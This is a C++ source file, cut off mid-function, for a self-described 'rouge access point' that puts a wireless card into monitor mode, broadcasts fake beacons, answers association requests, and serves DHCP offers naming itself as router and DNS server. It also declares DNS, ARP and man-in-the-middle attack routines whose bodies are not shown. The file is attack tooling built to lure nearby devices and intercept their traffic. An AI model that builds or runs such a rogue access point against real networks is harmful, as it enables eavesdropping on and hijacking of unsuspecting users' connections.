/* * * * * * * * * * * * * * * * * * * * * * * \
* A rouge access point!   /666/              *
* © 2016 Ryan D. Lockman All Rights Reserved *
\* * * * * * * * * * * * * * * * * * * * * * * /

/* NOTES
    specify weather functions take ops and types as htonl/s or not
    replace return -1 with return EXIT_FAILURE
*/

// Headers
#include <cstdlib>
#include <cassert>
#include <ctime>
#include <cstdio>
#include <iostream>
#include <cstring>
#include <csignal>
#include <cerrno>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <netinet/ip_icmp.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <linux/filter.h>
#include <linux/if.h>
#include <linux/wireless.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <poll.h>
#include <sys/select.h>

#include "ieee80211.h"
#include "radiotap.h"

// Defines
#define RING_FRAMES 128        // number of frames in ring
#define BEACON_INTERVAL 102400 // 102.4 ms (100 TU) when divided by 1024

#ifndef SOL_PACKET
#define SOL_PACKET 263
#endif

// ANSI Excape Macros
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define NF      "\033[0m"
#define CLRLN   "\033[2K"
#define CUP     "\033[1A"
#define CLRSCRN "\033[2J\033[1;1H"

// Static Globals
static volatile sig_atomic_t sigCond = 0; // signal condition variable
static int rxring_offset             = 0; // rx ring offset
static int txring_offset             = 0; // tx ring offset
static iwreq old_iwr;                     // saved mode
static ifreq old_ifr;                     // saved flags
static unsigned char *ring;               // ring
static uint16_t seqNum               = 0; // sequence number for packet tx
static const bool FALSE = false,
                  TRUE  = true;

// IEEE 802.11 PHY Modes = B, BG, BGN
/* B   has IE's SSID, Rates, DS, TIM for beacons,
 *     plus no ext rates in assoc resp
 *
 * G   
 *
 * BG  has all of B's and adds ERP(barker preamable true), EXT rates
 *     plus has beacon capabilities short start seq true
 *
 * N   future version
 *
 * BGN has all BG's and adds HT capabilities and ERP(protection true)
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

// 80211_B Base BCast Rate
static const uint8_t baseRate_80211B  = 0x02; // 1 mbs
static const uint8_t baseRate_80211G  = 0x04; // 2 mbs
static const uint8_t baseRate_80211BG = 0x02; // 1 mbs

static const uint8_t IEEE80211_BCAST_ADDR[ETH_ALEN] = { // mac broadcast
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};

static const uint8_t IEEE80211_IPV6MCAST_ADDR[ETH_ALEN] = { // ipv6 multicast
    0x33, 0x33, 0x00, 0x00, 0x00, 0x02
};

static const uint8_t ARP_BCAST_ADDR[ETH_ALEN] = { // media broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t IEEE80211BG_DEFAULT_RATES[] = { // BG rates
	IEEE80211_RATE_BASIC | 2,  // basic, B
	IEEE80211_RATE_BASIC | 4,  // basic (default), B
	IEEE80211_RATE_BASIC | 11, // basic, B
	IEEE80211_RATE_BASIC | 22, // basic, B
    36,  // G
    48,  // G
    72,  // G
    108, // G
};

static const uint8_t IEEE80211G_DEFAULT_RATES[] = { // BG rates
	IEEE80211_RATE_BASIC | 2,  // basic, B
	IEEE80211_RATE_BASIC | 4,  // basic (default), B
	IEEE80211_RATE_BASIC | 11, // basic, B
	IEEE80211_RATE_BASIC | 22, // basic, B
    36,  // G
    IEEE80211_RATE_BASIC | 48, // basic, G
    72,  // G
    108, // G
};

static const uint8_t IEEE80211B_DEFAULT_RATES[] = { // B rates
	IEEE80211_RATE_BASIC | 2,  // basic(default), B
	IEEE80211_RATE_BASIC | 4,  // basic, B
	IEEE80211_RATE_BASIC | 11, // basic, B
	IEEE80211_RATE_BASIC | 22, // basic, B
};

static const uint8_t IEEE80211BG_EXT_RATES[] = {
    12,
    18,
    24,
    96,
};

static const uint8_t IEEE80211G_EXT_RATES[] = {
    IEEE80211_RATE_BASIC | 12, // basic
    18,
    IEEE80211_RATE_BASIC | 24, // basic
    96,
};

#define IEEE80211BG_EXT_RATES_LENGTH sizeof(IEEE80211BG_EXT_RATES) // BG ext rates size
#define IEEE80211G_EXT_RATES_LENGTH  sizeof(IEEE80211B_EXT_RATES)  // G  ext rates size
// no B EXT Rates

#define IEEE80211BG_DEFAULT_RATES_LENGTH sizeof(IEEE80211BG_DEFAULT_RATES) // BG default rates size
#define IEEE80211G_DEFAULT_RATES_LENGTH  sizeof(IEEE80211G_DEFAULT_RATES)  // G  default rates size
#define IEEE80211B_DEFAULT_RATES_LENGTH  sizeof(IEEE80211B_DEFAULT_RATES)  // B  default rates size

// DHCP Stuff
#define BOOTP_REQUEST      1
#define BOOTP_REPLY        2
#define BOOTP_FL_BROADCAST 0x8000
#define BOOTPS_PORT        67
#define BOOTPC_PORT        68

#define DHCP_MAGIC_COOKIE  0x63825363
#define DHCP_DISCOVER      1
#define DHCP_OFFER         2
#define DHCP_REQUEST       3
#define DHCP_DECLINE       4
#define DHCP_ACK           5
#define DHCP_NACK          6
#define DHCP_RELEASE       7
#define DHCP_INFORM        8

// Global Structures
typedef struct {
    // Start Bootstrap Protocol Header
    uint8_t  op,
             htype, // ARPHRD_XXX are usually 16 wide
             hlen,
             hops;
    uint32_t xid;
    uint16_t secs,
             flags;
    in_addr  ciaddr,
             yiaddr,
             siaddr,
             giaddr;
    uint8_t  chaddr[16];
    char     sname[64],
             file[128];
    // Start DHCP Header
    uint32_t magic;
  //uint8_t  options[0];
} dhcphdr;

// Our Options Struct
typedef struct {
    uint8_t op_msg_type,
            len_msg_type,
            type;
}__attribute__((packed)) dhcp_msg_type;

typedef struct {
    uint8_t  op_msg_type,      // msg type(53)
             len_msg_type,     // 1
             type;             // ACK(5)

    uint8_t  op_sid,           // server id(54)
             len_sid,          // 4
             sid[IP_ALEN];     // 192.168.0.2

    uint8_t  op_lease,         // addr lease time(51)
             len_lease;        // 4
    uint32_t lease;            // 1 day, 86400s

    uint8_t  op_renewal,       // renewal time val(58)
             len_renewal;      // 4
    uint32_t renewal;          // 12 hrs, 43200s

    uint8_t  op_rebind,        // rebind time val(59)
             len_rebind;       // 4
    uint32_t rebind;           // 21 hrs, 75600s

    uint8_t  op_submask,       // subnet mask(1)
             len_submask,      // 4
             submask[IP_ALEN]; // 255.255.255.0

    uint8_t  op_bcast,         // broadcast addr(28)
             len_bcast,        // 4
             bcast[IP_ALEN];   // 192.168.0.255

    uint8_t  op_dname,         // domain name(15)
             len_dname,        // 7, can be greater depends on name 
             dname[7];         // PK5001Z

    uint8_t  op_dns,           // domain name serv(6)
             len_dns,          // 4, can be greater depends on # of dns's
             dns1[IP_ALEN];    // 192.168.0.2

    uint8_t  op_router,        // router(3)
             len_router,       // 4
             router[IP_ALEN];  // 192.168.0.2

    uint8_t  op_end;           // end(255), mandatory
}__attribute__((packed)) dhcp_options;


// Quick & Dirty Code
dhcp_options apd_dhcp0_ack = {
    53,
    1,
    5, // DHCP_ACK

    54,
    4,
    { 0xc0, 0xa8, 0x00, 0x02 },

    51,
    4,
    0x80510100, // in htonl

    58,
    4,
    0xc0a80000, // in htonl

    59,
    4,
    0x50270100, // in htonl

    1,
    4,
    { 0xff, 0xff, 0xff, 0x00 },

    28,
    4,
    { 0xc0, 0xa8, 0x00, 0xff },

    15,
    7,
    { 0x50, 0x4b, 0x35, 0x30, 0x30, 0x31, 0x5a },

    6,
    4,
    { 0xc0, 0xa8, 0x00, 0x02 },

    3,
    4,
    { 0xc0, 0xa8, 0x00, 0x02 },

    255,
};

// Dirty
dhcp_options apd_dhcp0_offer = {
    53,
    1,
    2, // DHCP_OFFER

    54,
    4,
    { 0xc0, 0xa8, 0x00, 0x02 },

    51,
    4,
    0x80510100, // in htonl

    58,
    4,
    0xc0a80000, // in htonl

    59,
    4,
    0x50270100, // in htonl

    1,
    4,
    { 0xff, 0xff, 0xff, 0x00 },

    28,
    4,
    { 0xc0, 0xa8, 0x00, 0xff },

    15,
    7,
    { 0x50, 0x4b, 0x35, 0x30, 0x30, 0x31, 0x5a },

    6,
    4,
    { 0xc0, 0xa8, 0x00, 0x02 },

    3,
    4,
    { 0xc0, 0xa8, 0x00, 0x02 },

    255,
};

typedef struct {
    uint16_t xid,
             flags, // QR | Opcode | AA | TC | RD | RA | Z | RCode
             qdcount, // questions
             ancount, // anser rr's
             nscount, // authority rr's
             arcount; // additional rr's
    // Queries
    // Answers
    // Authority
    // Additioal
    // uint8_t variable[0]
} dnshdr;

typedef struct {
    uint8_t  qname[16];
    uint16_t qtype,
             qclass;
}__attribute__((packed)) dns_question; // question section(query)

typedef struct {
    uint16_t aname,
             atype,
             aclass;
    uint32_t ttl;
    uint16_t rdlength;
    uint32_t rdata;
}__attribute__((packed)) dns_ans_auth_add; // answer, authority, additional sections

typedef struct {
    in_addr  saddr,
             daddr;
	uint8_t  pad,
             protocol;
	uint16_t udp_len;
	udphdr   udp;
    uint8_t *payload;
} psudeo_udphdr;

typedef struct {
	uint8_t        macAddr[ETH_ALEN],
                   ipaddr[IP_ALEN];
	const uint8_t *ssid;
    std::size_t    ssidLen;
	const uint8_t *dataRates;
    std::size_t    dataRatesLen;
    const uint8_t *dataRatesExt;
    std::size_t    dataRatesExtLen;
} APDescriptor;

typedef struct {
	__le16 frame_ctl,
           duration_id;
	uint8_t payload[0];
}__attribute__((packed)) ieee80211_hdr;

typedef struct {
    uint8_t  cur_hop_limit,
             flags;
    uint16_t lifetime;  // 0 is unspecified(def is 10 min)
    uint32_t reachable, // 0 is unspecified(def is 7 min)
             retrans;   // 0 is unspecified(def is 10 min)
}__attribute__((packed)) icmpv6_data;

typedef struct {
    uint8_t type, // sll
            len,
            lla[ETH_ALEN];
}__attribute__((packed)) icmpv6_options_sll;

// Our APs
APDescriptor ap0 = {
	{ 0x00, 0x26, 0x88, 0xba, 0x86, 0x09 }, // mac
    { 0xc0, 0xa8, 0x00, 0x02 }, // ip   
	(const uint8_t*)"searching...FOUND", // ssid
    17, // ssid len, no term char
	IEEE80211BG_DEFAULT_RATES, // rates
    IEEE80211BG_DEFAULT_RATES_LENGTH, // rates len
    IEEE80211BG_EXT_RATES, // ext rates
    IEEE80211BG_EXT_RATES_LENGTH, // ext rates len
};

static char* currTime(const char *format) { // non-reentrant
    // Get Time
    std::time_t t = std::time(NULL);
    tm *tm        = std::localtime(&t);
    if(!tm)
        return NULL;
    
    // Format Time
    const std::size_t BUF_SIZE = 256;
    static char buf[BUF_SIZE];
    std::size_t s = std::strftime(buf, BUF_SIZE, format ? format : "%c", tm);

    return !s ? NULL : buf;
}

// Function Prototypes
static void     sighand(int sig, siginfo_t *si, void *ucontext) { ++sigCond; } // signal handler
static int      rfmon_up(const char *const ifc, int sfd);
static int      rfmon_down(const char *const ifc, int sfd);
static int      promisc_up(const char *const ifc, int sfd);
static int      promisc_down(const char* const ifc, int sfd);
// add map_create
static int      map_destruct(unsigned char *&ring);
static void*    process_rx(unsigned char *&ring, int sfd);
static void*    process_tx(unsigned char *&ring, int sfd, tpacket_req3 treq);
static void     rx_release(unsigned char *&ring);
static void     tx_release(unsigned char *&ring, const unsigned len, tpacket_req3 treq);
static int      safe_usleep(const useconds_t usec);
static uint64_t getCurTstamp();
static int      incrementTV(timeval *time, suseconds_t increment);
static int      diffTV(const timeval *first, timeval *second);
static int      compareTV(const timeval *first, const timeval *second);
static int      processPacket(const tpacket2_hdr *const packet, const unsigned size, const char *const iface,
                const uint8_t chan, const int s_sfd);
static int      createSendSocket(const char *const iface);
static int      createSocket(const APDescriptor *const apd, const char *const iface, const bool rfmon, const bool promisc);
static int      sendUDP(const uint8_t *const packet, const unsigned len);
static void     header_dump(const unsigned char *const buf, const unsigned len);
static int      sendBeacon(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate,
                    const char *const iface, const bool probeResp, const unsigned char *const da, const int sfd);
static int      sendAuthResp(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
                    const unsigned char *const da, const int sfd);
static int      sendAssoscResp(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
                    const unsigned char *const da, const int sfd);
static int      sendAck(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
                    const unsigned char *const ra, const bool ctsFlag, const int sfd);
static int      sendDHCP(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
                    const uint8_t *const tip, const uint8_t *const tha, const uint32_t dhcp_xid, const int sfd, const uint8_t dhcp_type);
static int      sendDNS(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
                    const uint8_t *const tip, const uint8_t *const tha, const uint32_t dns_xid, const int sfd);
static int      sendARP(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
                    const uint8_t *const tip, const uint8_t *const tha, const uint16_t opcode, const int sfd);
static int      sendICMP(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
                    const uint8_t *const tip, const uint8_t *const tha, const uint8_t icmp_type, const uint8_t icmp_code,
                    const int sfd);
static int      sendICMPv6(const APDescriptor *const apd, const uint8_t chan, const uint8_t dRate, const char *const iface,
                           const uint8_t *const tha, const uint8_t icmp_type, const uint8_t icmp_code,
                           const int sfd);
static int      mitm_attack(uint8_t *const packet, const unsigned len, const char *const iface, const bool fromDS,
                    const uint8_t *const host, const uint8_t *const router, const uint8_t *const tip, const int sfd);
static uint16_t chan_to_freq(const unsigned chan);
static uint16_t checksum(const uint16_t *buf, unsigned len);
static uint16_t checksumUDP(const uint16_t *buf, const uint16_t len, const uint8_t *const sip, const uint8_t *const tip);

const uint32_t CRC32_TBL_SIZE = 256,
               CRC32_SEED     = 0xFFFFFFFF;

const uint32_t crc_tbl[CRC32_TBL_SIZE] = {
    0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
    0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,
    0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
    0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,
    0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
    0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
    0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
    0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,
    0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
    0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
    0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
    0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
    0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
    0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
    0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,
    0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,
    0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683,
    0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,
    0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7,
    0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,
    0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
    0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79,
    0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F,
    0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,
    0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,
    0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21,
    0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,
    0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,
    0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB,
    0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,
    0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF,
    0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D
};

// Calculate CRC32 (my own way, clean/fast loop)
uint32_t calc_crc32(uint8_t *buf, unsigned len) {
    uint32_t crc = CRC32_SEED;
    for(; len--; crc = crc_tbl[(crc ^ *buf++) & 0xFF] ^ crc >> 8);
    return ~crc;
    
    //for(std::size_t i = 0; i < len; crc = crc_tbl[(crc ^ buf[i++]) & 0xff] ^ (crc >> 8));   
}

// Add Frame Check Sequence(FCS) To End Of 802.11 Frame
void add_crc32(uint8_t *buf, unsigned len) {
    uint32_t crc = calc_crc32(buf, len);

    buf[len    ] = (crc      ) & 0xFF;
    buf[len + 1] = (crc >>  8) & 0xFF;
    buf[len + 2] = (crc >> 16) & 0xFF;
    buf[len + 3] = (crc >> 24) & 0xFF;
}

// Verify Already Computed Checksum
int check_crc_buf(uint8_t *buf, unsigned len) {
    uint32_t crc = calc_crc32(buf, len);

    return (
        buf[len    ] == ((crc      ) & 0xFF) &&
        buf[len + 1] == ((crc >>  8) & 0xFF) &&
        buf[len + 2] == ((crc >> 16) & 0xFF) &&
        buf[len + 3] == ((crc >> 24) & 0xFF)
    );
}

/*
 * IEEE 802.x version (Ethernet and 802.11, at least) - byte-swap
 * the result of "crc32()".
 *
 * XXX - does this mean we should fetch the Ethernet and 802.11
 * FCS with "tvb_get_letohl()" rather than "tvb_get_ntohl()",
 * or is fetching it big-endian and byte-swapping the CRC done
 * to cope with 802.x sending stuff out in reverse bit order?
 */
uint32_t crc32_802(uint8_t *buf, unsigned len) {
    uint32_t crc = calc_crc32(buf, len);

    // Reverse Bytes
    crc = ((uint8_t)(crc >>  0) << 24) |
          ((uint8_t)(crc >>  8) << 16) |
          ((uint8_t)(crc >> 16) <<  8) |
          ((uint8_t)(crc >> 24) <<  0);

    return crc;
}

// Main
int main(int argc, char **argv) {
    // Check Args
    if(argc < 3 || !std::strncmp(argv[1], "-h", std::strlen("-h") + 1)) {
        std::cerr << "\nUsage: " << argv[0] << " [interface] [channel] [keep-mon-up]\n\n";
        return EXIT_FAILURE;
    }

    // Check CAP_NET_RAW Root
    if(geteuid() || getuid()) {
        std::cerr << "\nMust be root!\n\n";
        return EXIT_FAILURE;
    }

    // Set Up Arguments
    const unsigned    CHANN = std::atoi(argv[2]);
    const char* const IFACE = argv[1];

    // Check Channel
    if(CHANN < 0 || CHANN > 14) {
        std::cerr << "\nError, 0 < Channel < 14\n";
        return EXIT_FAILURE;
    }
    
    // Set Up Signal Handler
    struct sigaction sa;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags     = 0;
    sa.sa_sigaction = sighand;

    if(sigaction(SIGINT,  &sa, NULL) == -1) { // SIGINT
        std::perror("sigaction - SIGINT");
        return EXIT_FAILURE;
    }
    if(sigaction(SIGQUIT, &sa, NULL) == -1) { // SIGQUIT
        std::perror("sigaction - SIGQUIT");
        return EXIT_FAILURE;
    }
    if(sigaction(SIGCHLD, &sa, NULL) == -1) { // SIGCHLD
        std::perror("sigaction - SIGCHLD");
        return EXIT_FAILURE;
    }
    if(sigaction(SIGHUP, &sa, NULL) == -1) {  // SIGHUP
        std::perror("sigaction - SIGHUP");
        return EXIT_FAILURE;
    }
    
    // Block SIGCHLD Incase Early Termination of Child
    sigset_t blockMask;
    sigemptyset(&blockMask);
    sigaddset(&blockMask, SIGCHLD);

    if(sigprocmask(SIG_SETMASK, &blockMask, NULL)) {
        std::perror("sigprocmask");
        return EXIT_FAILURE;
    }
    
    // Create Sockets
    int r_sfd = createSocket(&ap0, argv[1], TRUE, TRUE), // read
        s_sfd = createSendSocket(argv[1]);               // write
    if(r_sfd == -1 || s_sfd == -1) {
        std::cerr << "\ncreate sockets error\n";
        return EXIT_FAILURE;
    }

    // Fork Program Flow
    pid_t cpid = fork();
    switch(cpid) {
    // Error
    case -1:
        std::perror("fork");
        return EXIT_FAILURE;
    // Child
    case 0:
        // Child's Infinite Loop
        for(;; safe_usleep(BEACON_INTERVAL)) // 102.4 ms(100 TU)
            if(sendBeacon(&ap0, CHANN, baseRate_80211B, IFACE, FALSE, NULL, s_sfd) == -1) { // send beacon
                std::cerr << "\nsendBeacon error\n";
                exit(EXIT_FAILURE);
            }

        // Shouldn't Get Here
        std::cerr << "\nChild Error\n";
        exit(EXIT_FAILURE);
    // Parent
    default:
        break;
    };
    
    // Use Empty Mask During Suspend(unblock all)
    sigset_t emptyMask;
    sigemptyset(&emptyMask);

    // Parent's Infinite Loop
    for(;;) {
        // Set Up Read Descriptors
        fd_set rfds;
        FD_ZERO(&rfds);     // clear set
        FD_SET(r_sfd, &rfds); // add our socket to set

        // Monitor FDs Until One Is Ready
        int ret = select(r_sfd + 1, &rfds, NULL, NULL, NULL);
        if(ret == -1) { // error
            // Check Interupt
            if(errno == EINTR)
                break;
            
            // Other Error
            std::perror("select");
            return EXIT_FAILURE;
        }
        else if(ret) { // data ready
            // Ready Data, So Grab Packet
            if(FD_ISSET(r_sfd, &rfds)) {
                const tpacket2_hdr *const packet = (tpacket2_hdr*)process_rx(ring, r_sfd);
                if(!packet)
                    break;

                // Process Packet
                if(processPacket(packet, packet->tp_snaplen, IFACE, CHANN, s_sfd) == -1) { // -1, hard error
                    std::cerr << "\nprocessPacket error" << std::endl;
                    return EXIT_FAILURE;
                }
            }

            // Release Packet
            rx_release(ring);
        }
        else // timed out
            assert(!ret);
    }

    // Clean Up
    std::cout << "\nCleaning Up...";
    std::fflush(stdout); // flush

    // Unset Monitor Mode
    if(argv[3]) // not null
        if(rfmon_down(IFACE, r_sfd)) {
            std::cout << " [" << RED << "BAD" << NF << ']';       
            return EXIT_FAILURE;
        }

    // Sure Kill Child
    if(kill(cpid, SIGKILL)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        std::perror("kill");
        return EXIT_FAILURE;
    }
    
    // Unset Promiscous Mode
    if(promisc_down(IFACE, r_sfd)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        return EXIT_FAILURE;
    }

    // Destrust Ring Map
    if(map_destruct(ring)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        return EXIT_FAILURE;
    }
    
    // CLose Sockets
    if(close(r_sfd)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        std::perror("close");
        return EXIT_FAILURE;
    }
    if(close(s_sfd)) {
        std::cout << " [" << RED << "BAD" << NF << ']';       
        std::perror("close");
        return EXIT_FAILURE;
    }


    // Verbose
    sleep(1);                                     // sleep for verbose
    std::cout << " [" << GREEN "OK" << NF << ']';
    std::fflush(stdout);                          // flush
    sleep(1);                                     // sleep for verbose

    // Success
    std::cout << "\n\nGood-Bye!\n\n";
    return EXIT_SUCCESS;
}

// Function Definitions
int rfmon_up(const char *const ifc, int sfd) {
    // Declarations
    ifreq ifr;
    iwreq iwr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&iwr, 0, sizeof(iwr));

    // Set Interface Down, ifr_flags = 0 from memset
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) { // set flags
        std::perror("rfmon_up: ioctl - SIOCSIFFLAGS-1");
        return -1;
    }

    // Get Mode
    std::strncpy(iwr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCGIWMODE, &iwr) == -1) {
        std::perror("rfmon_up: ioctl - SIOCGIWMODE");
        return -1;
    }
 
    // Set Interface Mode
    std::strncpy(old_iwr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    iwr.u.mode = IW_MODE_MONITOR;                  // set monitor mode
    if(ioctl(sfd, SIOCSIWMODE, &iwr) == -1) {
        std::perror("rfmon_up: ioctl - SIOCSIWMODE");
        return -1;
    }

    // Bring Interface Up
    ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING; // OR in up, broadcast, running

    // Set Interface Flags
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
        std::perror("rfmon_up: ioctl - SIOCSIFFLAGS-2");
        return -1;
    }

    // Success
    return 0;
}

int rfmon_down(const char *const ifc, int sfd) {
    // Declarations
    ifreq ifr;
    iwreq iwr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
    std::memset(&iwr, 0, sizeof(iwr));   
    
    // Set Interface Down, ifr_flags = 0 from memset
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ);     // copy in interface device
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {     // set flags
        std::perror("rfmon_down: ioctl - SIOCSIFFLAGS-1");
        return -1;
    }

    // Set Interface Mode
    std::strncpy(old_iwr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    old_iwr.u.mode = IW_MODE_INFRA;                // not set, set managed mode
    if(ioctl(sfd, SIOCSIWMODE, &old_iwr) == -1) {
        std::perror("rfmon_down: ioctl - SIOCSIWMODE");
        return -1;
    }

    // Bring Interface Up
    old_ifr.ifr_flags |= IFF_UP | IFF_BROADCAST | IFF_RUNNING; // OR in up, broadcast, running

    // Set Interface Up
    std::strncpy(old_ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if(ioctl(sfd, SIOCSIFFLAGS, &old_ifr) == -1) {
        std::perror("rfmon_down: ioctl - SIOCSIFFLAGS-2");
        return false;
    }

    // Success
    return 0;
}
int promisc_up(const char *const ifc, int sfd) {
    // Declarations
    ifreq ifr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));

    // Get Interface Flags
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if((ioctl(sfd, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("promisc_up: ioctl - SIOCGIFFLAGS");
	    return -1;
	}

    // OR In Promiscuous
    if((ifr.ifr_flags & IFF_PROMISC) == ifr.ifr_flags)  // check if set
        return 0;                                       // already set
    else
        ifr.ifr_flags |= IFF_PROMISC;                   // not set, set promsicuous

    // Set Interface Flags   
    if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
        std::perror("promisc_up: ioctl - SIOCSIFFLAGS");
        return -1;
    }

    // Success
    return 0;
}

int promisc_down(const char *const ifc, int sfd) {
    // Declarations
    ifreq ifr;

    // Zero Out
    std::memset(&ifr, 0, sizeof(ifr));
     
    // Get Interface Flags
    std::strncpy(ifr.ifr_name, ifc, IFNAMSIZ); // copy in interface device
    if((ioctl(sfd, SIOCGIFFLAGS, &ifr) == -1)) {
	    std::perror("promisc_down: ioctl - SIOCGIFFLAGS");
	    return -1;
	}

    // AND Out Promiscuous
    if((ifr.ifr_flags & IFF_PROMISC) == ifr.ifr_flags) // check if set
        ifr.ifr_flags &= ~IFF_PROMISC;                 // unset promiscuous
    else
        return 0;                                      // already set

    // Set Interface Flags
	if(ioctl(sfd, SIOCSIFFLAGS, &ifr) == -1) {
